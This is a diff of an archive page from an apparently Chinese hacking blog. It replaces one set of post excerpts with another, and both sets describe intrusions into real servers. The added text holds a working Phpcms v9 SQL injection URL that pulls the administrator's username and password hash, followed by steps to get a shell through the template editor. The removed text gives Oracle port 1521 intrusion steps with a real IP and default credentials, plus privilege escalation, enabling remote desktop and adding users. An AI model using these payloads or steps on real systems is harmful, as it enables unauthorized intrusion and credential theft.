@@ -45,29 +45,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T11:12:24.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-09-09T09:24:06.000Z" itemprop="datePublished">
+          2012-09-09
       </time>
     
     
     | 
-    <a href='/tag/某某网络渗透测试报告/'>某某网络渗透测试报告</a>,
-    
-    <a href='/tag/渗透测试报告/'>渗透测试报告</a>
+    <a href='/tag/漏洞/'>漏洞</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/562.seo/">渗透测试报告</a></h2>
+      <h2 class="post-title"><a href="/816.seo/">微信任意用户密码修改漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><b>某某网络渗透测试报告</b><b></b></p>  <p>目录   <br />0x1概述    <br />1.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透范围    <br />1.2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透测试主要内容    <br />0x2 脆弱性分析方法    <br />0x3 渗透测试过程描述    <br />3.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 遍历目录测试    <br />3.2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 弱口令测试    <br />3.3&#160;&#160;&#160;&#160;&#160;&#160;&#160; Sql注入测试    <br />3.4&#160;&#160;&#160;&#160;&#160;&#160;&#160; 内网渗透    <br />3.5&#160;&#160;&#160;&#160;&#160;&#160;&#160; 内网嗅探    <br />0x4 分析结果与建议</p>  <p>   <br />0x1 概述    <br />某时段接到xx网络公司授权对该公司网络进行模拟黑客攻击渗透,在xx年xx月xx日-xx年xx月xx日.对xx网络公司的外网服务器和内网集群精心全面脆弱性黑盒测试.完成测试得到此份网络渗透测试报告。    <br />1.1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透范围    <br />此次渗透测试主要包括对象：    <br />某网络公司外网web服务器.企业邮局服务器,核心商业数据服务器和内网办公网络系统。    <br />1.2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 渗透测试主要内容    <br />本次渗透中，主要对某网络公司web服务器,邮件服务器进行遍历目录,用户弱口令猜解，sql注入漏洞，数据库挖掘，内网嗅探,以及域服务器安全等几个方面进行渗透测试。</p>  <p>   <br />0x2 脆弱性分析方法    <br />按照国家工信部is900标准,采用行业内认可的测试软件和技术人员手工操作模拟渗透。</p>  <p>   <br />0x3 渗透测试过程描述    <br />3.1 遍历目录测试    <br />使用载入国内外3万多目录字典的wwwscan对web和邮件服务器进行目录探测。得到探测结果。主站不存在遍历目录和敏感目录的情况。但是同服务器站点存在edit编辑器路径。该编辑器版本过低。存在严重漏洞。如图    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/e91cad0821e6_2CEB/clip_image001.jpg" width="508" height="221" /></p>
+        <p><b><a href="http://pkav.net/">PKAV技术宅社区</a></b><a href="http://pkav.net/2012/09/%E5%BE%AE%E4%BF%A1%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/">http://pkav.net/2012/09/%E5%BE%AE%E4%BF%A1%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/</a></p>  <p>今天发现个微信群发的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>.还没玩.就被修补了.    <br />于是就有了这个漏洞的产生.    <br />同样问题产生在重置用户密码的环节.    <br />在微信官方的首页上发现新增了如下功能模块</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/09/1.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/1dfa7939fe87_1385/clip_image001.jpg" width="525" height="276" /></a>    <br />访问后看到这个功能.来了兴趣</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/09/2.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/1dfa7939fe87_1385/clip_image002.jpg" width="712" height="370" /></a>    <br />在这个页面输入一个已经注册了微信的手机号.</p>  <p><a href="http://pkav.net/wp-content/uploads/2012/09/3.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/1dfa7939fe87_1385/clip_image003.jpg" width="415" height="323" /></a></p>
       
       </p>
       
       <p>
-          <a href="/562.seo/" class="excerpt-link">Read More...</a>
+          <a href="/816.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -76,27 +74,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T10:29:47.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-09-09T06:24:45.000Z" itemprop="datePublished">
+          2012-09-09
       </time>
     
     
     | 
-    <a href='/tag/WEP/'>WEP</a>
+    <a href='/tag/银行/'>银行</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/559.seo/">WEP无客户端，不在是谜 照样拿下</a></h2>
+      <h2 class="post-title"><a href="/813.seo/">路过杭州某银行查询机</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>发篇<a href="http://ha.cker.in/tag/WEP" target="_blank">WEP</a>无线破解入门教程：</p>  <p>很多朋友在学习WEP的时候没有客户端就停下了，现在我给你们带来福音了，没客户端照样拿下</p>  <p>故事是这样发生的，是一场偶遇</p>  <p>我朋友今天买了一个卡X，不知道怎么学习密码，打我电话把我教过去让我教他学习密码，朋友一场帮个忙，立马我打的跑去他家</p>  <p>帮他驱动安装好，进到BT3里面学习密码，我一看 DATA为0 后面没打钩，我当时感到很够呛的，心想朋友叫我来教他学习密码，</p>  <p>我却弄不出，不是很丢脸，不管3721的，我就选择了一个0841，然后让他一直处于读包状态，后来我就叫我朋友抽烟，边抽边聊着</p>  <p>聊得很广的，聊到了撒哈拉沙漠，聊到了奥巴马，最后聊到个女人。。烟也抽完了，我走进电脑一看，读包栏里的DATA还是很大很圆的</p>  <p>一个O，我心想希望没了，还是不涨，我朋友就问我还要多久，我说快了。</p>  <p>没办法，把自己的本本拿出来插上卡X进BT3，用命令学习，看能不能学习到</p>  <p>立马键盘上一顿狂输，命令一条条的出现，快到与目标AP进行虚拟连接的这一步了，脑中里一道灵光闪出</p>  <p>心想，用本本进行虚拟连接，看能让朋友那台的DATA升起来不，立刻我输入命令，如果之后，我一步步走进</p>  <p>我朋友的电脑，心里默念到（菩萨保佑 耶稣保佑 南无阿弥陀佛）当我没迈进朋友电脑一步，我心就跳很快</p>  <p>心想，你千万得升啊，不升我就颠了。。。终于到了电脑朋友一看，我一看傻了DATA是狂升，几百几百的升</p>  <p>我立刻把目光锁定到客户端一看00:1A:EF:0A:38:38这地址好熟悉啊，马上跑到自己本本把SHELL往上拉，拉到</p>
+        我就是进去办办业务取号等的时候看到台查询机，顺手一下，什么都没做…  Win2000的系统啊 真老了     后面探头好多还有工作人员，赶紧抓拍完了收工~
       
       </p>
       
       <p>
-          <a href="/559.seo/" class="excerpt-link">Read More...</a>
+          <a href="/813.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -105,29 +103,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T10:26:32.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-09-07T04:33:36.000Z" itemprop="datePublished">
+          2012-09-07
       </time>
     
     
     | 
-    <a href='/tag/1521/'>1521</a>,
+    <a href='/tag/SQL注入/'>SQL注入</a>,
     
-    <a href='/tag/oracle/'>oracle</a>
+    <a href='/tag/0day/'>0day</a>,
+    
+    <a href='/tag/Phpcms/'>Phpcms</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/557.seo/">入侵1521详细过程</a></h2>
+      <h2 class="post-title"><a href="/808.seo/">Phpcms v9最新Sql注入0day(转自乌云)</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>入侵<a href="http://ha.cker.in/tag/1521" target="_blank">1521</a>详细过程 </p>  <p>工具： </p>  <p>1.<a href="http://ha.cker.in/tag/oracle" target="_blank">oracle</a>精简版(我这已经安装了，这跳过) </p>  <p>2.sqlplus.exe 连接oracle数据库用（oracle里自带） </p>  <p>3.tnscmd.exe&#160;&#160; 查看服务器名字/sid </p>  <p>4.oscanner.exe oracle弱口令猜解工具 </p>  <p>第一步：扫描开了1521端口的服务器，oracle默认1521端口（这步跳过，端口谁都会扫） </p>  <p>第二步：利用tnscmd.exe查看服务器数据库的名字 </p>  <p>从这步开始了，这是刚找好的IP，就用它演示了，“SERVICE_NAME=<strong>*</strong>”这就是我们需要用到的。 </p>  <p>第三步：oscanner.exe猜解弱口令。 </p>  <p>猜解不会太快，呵呵，“DBSNMP/DBSNMP found”发现一个，再让它往下继续猜……“SCOTT/TIGER    <br />found’又一个，猜完了 </p>  <p>第四步：提权（提升oracle用户权限、开3389、添加windows用户） </p>  <p>看操作吧，首先当然是要连接数据库，&quot;已连接。&quot;那就是成功了，呵呵，oracle能猜出很多弱口令，但是 </p>  <p>很多都是低权限的，没法执行命令，所以我们就要提升oracle用户权限，“已选择14行。”权限很低~~~ </p>  <p>需要重新连接数据库，再次查看权限，“已选择140行。”这就可以让我们为所欲为了，呵呵，看到这些顿时兴奋了， </p>  <p>这就是成功执行命令了，“PL/SQL 过程已成功完成。Java 已创建。函数已创建。过程已创建。…….” </p>  <p>脚本里我加了开3389和添加用户……连接它的3389试试…. </p>  <p>熟悉的画面，一台oracle服务器就这么被拿下了，呵呵…….. </p>  <p>这是手工一步步进行的，方便大家了解这一过程，我也有全自动的1521，并非网上所流传的，效果那是相当好，呵呵 </p>  <p>但是不足之处就是，抓的没数量，但有质量！！！呵呵…… </p>  <p>远程接oracle命令：   <br />C:\&gt;sqlplus /nolog    <br />SQL&gt; connect SCOTT/TIGER@(description=(address_list=(address=(protocol=tcp)(host=60.30.73.162)(port=1521)))(connect_data=(SERVICE_NAME=ebestXDB))); </p>  <p>tnscmd用法：tnscmd status -h ip –indent </p>  <p>oscanner用法：oscanner -s ip -v </p>  <p>查看当前用户权限：SELECT PRIVILEGE FROM SESSION_PRIVS; </p>
+        <p>在phpcms/api.php?op=add_favorite中使用了urldecode，导致了一个sqlinject漏洞。$title = urldecode($title);   <br />省略??    <br />$data = array(‘title’=&gt;$title, ‘url’=&gt;$url, ‘adddate’=&gt;SYS_TIME, ‘userid’=&gt;$userid);    <br />省略??    <br />$favorite_db-&gt;insert($data);    <br /></p>  <p>(需要你先注册一个账户并且登陆后访问那个接口文件才会报错,进而<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>！）    <br />====================================================================    <br />利用POC：    <br />1、注册用户后，访问如下URL获取admin表的前缀：<a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527</a>    <br />2、修改如下URL中的admin表前缀名(xxoo_admin)，直接爆出管理员的用户名:密码:随机字串    <br /><a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271</a>    <br />MD5能破解    <br />后台拿shell    <br />进入后台后点击界面–模版风格–随便找个页面点击修改    <br />插入代码后点击提交..    <br />然后回到模版管理找到刚才修改的页面，点击 可视化..    <br /><a href="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001_thumb.jpg" width="339" height="318" /></a>    <br />恩，代码执行了</p>
       
       </p>
       
       <p>
-          <a href="/557.seo/" class="excerpt-link">Read More...</a>
+          <a href="/808.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -136,31 +136,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T10:23:56.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-09-03T09:14:46.000Z" itemprop="datePublished">
+          2012-09-03
       </time>
     
     
     | 
-    <a href='/tag/N点虚拟主机提权实例/'>N点虚拟主机提权实例</a>,
+    <a href='/tag/渗透/'>渗透</a>,
     
-    <a href='/tag/fckeditor/'>fckeditor</a>,
-    
-    <a href='/tag/IISPY/'>IISPY</a>
+    <a href='/tag/漏洞/'>漏洞</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/554.seo/">N点虚拟主机提权实例</a></h2>
+      <h2 class="post-title"><a href="/804.seo/">某官网的渗透笔记</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>首先说一下，这台服务器是我日错了。本来不是这个服务器，拿到webshell以后发现不是我要找的服务器，然后。。   <br />不管怎么说，先提权再说，谁会嫌自己服务器多(其实我真的嫌手上多的，谁来帮我打理维护啊。。。好吧，我说笑的)。    <br />作者：YoCo Smart    <br />来自：<a href="http://blackbap.org/">Silic Group Hacker Army</a>    <br /><a href="http://blackbap.org/">http://BlackBap.Org</a>    <br />一开始看的时候我就知道是一台虚拟主机，而且应该支持php,asp,aspx    <br />这个站首先我找到了一个FCKeditor，这个FCK编辑器没有FileManager文件夹，于是我构造了/fckeditor/editor/fckeditor.html?toolbar=default这个路径    <br />点击浏览服务器出现：/admin/<a href="http://ha.cker.in/tag/fckeditor" target="_blank">fckeditor</a>/dialog/select_images.php?f=form1.imgsrc&amp;imgstick=big    <br />这样一个地址，居然不是browser，估计版本更高级了吧    <br />好在服务器是IIS，比较省力的就传上去IIS解析漏洞的<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a>了（这个版本的FCK创建文件夹时禁止输入点“.”，但是可以抓包或者本地表单POST创建，方法很多）    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/N_2187/clip_image002.png" width="604" height="461" />    <br />目录不出意外的没有设置严，Porgrams目录可读，而且MYSQL的data目录也在里面（MySQL的data目录有可能在其他目录，比方说某磁盘根目录，Documents目录或者2008的Users目录等）    <br />D:/Program Files/MySQL/MySQL Server 5.0/data/mysql/user.MYD    <br />这个文件读出来却是这样的：</p>
+        原文：http://26836659.blogcn.com/articles/%E6%9F%90%E5%AE%98%E7%BD%91%E7%9A%84%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.html某官网的渗透笔记，挖掘的某0DAY拿到webshell，USER权限，联通外网，提权SYSTEM的EXP无效，看来打的补丁很全，服务器用的是微软FTP,MSSQL，没啥突破口。路过其他盘，发现一个小有年份的B
       
       </p>
       
       <p>
-          <a href="/554.seo/" class="excerpt-link">Read More...</a>
+          <a href="/804.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -169,29 +167,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T10:16:39.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-09-03T09:13:33.000Z" itemprop="datePublished">
+          2012-09-03
       </time>
     
     
     | 
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/中央民族大学/'>中央民族大学</a>
+    <a href='/tag/漏洞/'>漏洞</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/551.seo/">入侵中央民族大学主站服务器</a></h2>
+      <h2 class="post-title"><a href="/801.seo/">Bluecms漏洞大集合</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>作者：晓华[岁月联盟]</p>  <p>此文谨献给我亲爱的爸爸妈妈和热情的黑手读者！</p>  <p>来到大学快二个月了，感觉很好，认识了很多朋友，在这里结识了我的好兄弟夜枫。我学的是信息安全专业，感觉国内对这块投入很少，再加上有些网络系统管理员的安全意识比较低，总是认为我安装了最厉害的杀毒软件和严密的防火墙，并且把它们升级到最新版本，天天自动升级病毒库。恶意攻击可以避免，其实不是这样的。网络技术飞速的发展，网络安全技术和黑客攻击技术也在同步的发展，都是相互推动的，在做好了完整的安全防护外，我们还需要对系统的关键部分进行模拟的入侵测试，以找出系统存在的安全隐患并加以修复。人的意识最重要，别总是把希望寄托与强悍的杀毒软件和坚固的防火墙。</p>  <p>下面我将给新手朋友介绍下MYSQL5+PHP环境下的入侵技术。目标就拿中央民族大学主站作为入侵演示，之前朋友叫我检测下该站安全。现在用PHP做站的越来越多，PHP运行效率高，消耗系统资源比较低。再加上MYSQL是免费的数据库。PHP+MYSQL组合是黄金搭档，它们的安全问题也尤为重要。下面就简单介绍下基本入侵思路和MYSQL5注射的技巧。</p>  <p>既然是安全检测，肯定要用到网络安全扫描器进行系统信息收集。通过PING命令很轻松的得到该站IP地址，扫描软件我就用尖刀端口扫描器，速度快的它可以提高我们的入侵效率。扫描结果如下图1：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/663349f87027_1FC5/clip_image002.jpg" width="686" height="381" /></p>  <p>目标机器只对外开放了三个端口。溢出漏洞就别想了，这里就只留给我们二个端口可以突破，暴力破解终端密码？貌似我还没见人那样做哈。我们还是选择直接从80端口渗透进去吧！不知道目标站点的脚本程序安全怎么样。打开主站，是PHP的页面。后台数据库很可能是MYSQL，主机限制了3306端口对外开放，管理员对敏感端口的基本安全意识还是有的嘛！</p>
+        <p>既然论坛都整改了，把我所有所有的JB都清空了。大家有0day都舍不得放出来，好吧，从我开始吧，把我挖的0day都放出来了。希望大家有0day的都放出来。别藏着了，藏着Mjj了。   <br />&#160;&#160; Bluecms也就是从一个公司教程看到的cms，然后想了想，既然那里面拿来做教程，我就挖挖这套cms<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>，我也没深挖到底，也没能坚持把代码看完。但是已经发现了很多很多的问题。其实能拿到shell就可以了。    <br />&#160;&#160; author： 西毒    <br />来自 :<a href="http://hi.baidu.com/sethc5/blog">http://hi.baidu.com/sethc5/blog</a>    <br /><a href="http://img.cker.in/Bluecms_F32/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Bluecms_F32/clip_image001_thumb.jpg" width="644" height="594" /></a></p>
       
       </p>
       
       <p>
-          <a href="/551.seo/" class="excerpt-link">Read More...</a>
+          <a href="/801.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -200,31 +196,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T07:44:56.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-09-03T09:00:39.000Z" itemprop="datePublished">
+          2012-09-03
       </time>
     
     
     | 
-    <a href='/tag/安全加固/'>安全加固</a>,
-    
-    <a href='/tag/WIN2003/'>WIN2003</a>,
-    
-    <a href='/tag/服务器维护/'>服务器维护</a>
+    <a href='/tag/检测/'>检测</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/549.seo/">WIN2003服务器维护安全加固方案</a></h2>
+      <h2 class="post-title"><a href="/799.seo/">授权友情检测51cto</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>一：因为IIS(即Internet Information Server)的方便性和易用性，使它成为最受欢迎的Web服务器软件之一。但是，IIS的安全性却一直令人担忧。如何利用IIS建立一个安全的Web服务器，是很多人关心的话题。要创建一个安全可靠的Web服务器，必须要实现Windows 2003和IIS的双重安全，因为IIS的用户同时也是Windows 2003的用户，并且IIS目录的权限依赖Windows的NTFS文件系统的权限控制，所以保护IIS安全的第一步就是确保Windows 2000操作系统的安全，所以要对服务器进行安全加固，以免遭到黑客的攻击，造成严重的后果。 </p>  <p>二．我们通过一下几个方面对您的系统进行安全加固： </p>  <p>1． 系统的安全加固：我们通过配置目录权限，系统安全策略，协议栈加强，系统服务和访问控制加固您的系统，整体提高服务器的安全性。 </p>  <p>2． IIS手工加固：手工加固iis可以有效的提高iweb站点的安全性，合理分配用户权限，配置相应的安全策略，有效的防止iis用户溢出提权。 </p>  <p>3． 系统应用程序加固，提供应用程序的安全性，例如sql的安全配置以及服务器应用软件的安全加固。 </p>
+        应51cto公司人员邀请   本小组shell2me对51cto.com整站进行一个黑盒安全测试    只进行友情检测，不对51cto旗下任何网站进行破坏性行为    51cto将提供其公司纪念奖品，以及感谢信，作为发现漏洞奖励    启动时间为2011年12月23日 21：30   shell2me参与友情检测人员名单(排名不分先后)：     Jesus     Jacks     神刀     星轨     Mix、小拽     
       
       </p>
       
       <p>
-          <a href="/549.seo/" class="excerpt-link">Read More...</a>
+          <a href="/799.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -232,7 +224,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/2012/page/13/">← Newer Posts</a>
-    <span class="page-number">Page 14 of 29</span>
+    <span class="page-number">Page 14 of 40</span>
     <a class="older-posts" href="/archives/2012/page/15/">Older Posts →</a>
   </nav>
 </main>
